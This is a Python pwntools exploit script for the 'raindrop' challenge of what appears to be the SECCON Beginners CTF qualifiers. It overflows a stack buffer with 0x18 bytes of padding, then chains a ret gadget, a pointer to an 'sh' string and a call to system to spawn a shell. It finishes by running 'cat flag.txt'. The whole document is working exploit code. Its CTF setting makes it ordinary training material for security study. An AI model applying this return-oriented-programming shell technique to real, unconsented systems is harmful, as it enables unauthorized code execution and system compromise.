from pwn import *

binfile = "./chall"
context.binary = binfile
context.log_level = 'critical'
elf = ELF(binfile)

help = elf.symbols['help']

HOST='raindrop.quals.beginners.seccon.jp'
PORT=9001
io = process(binfile)
# io = remote(HOST, PORT)

rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0]) # pop ret
rop.raw(pack(next(elf.search(b'sh\0'))))  # sh, 0x4020f0: finish -> 0x4020f4: s, 0x4020f6: h
rop.raw(pack(0x4011e5)) # call system

# "A"*0x19: segmentation fault
payload = b"A"*0x18  + rop.chain()

io.sendlineafter(b'?', payload)

io.sendline(b'echo exploited')
io.sendlineafter(b'exploited\n', b'cat flag.txt')

print(io.readline().decode('utf-8', 'ignore'), end='')
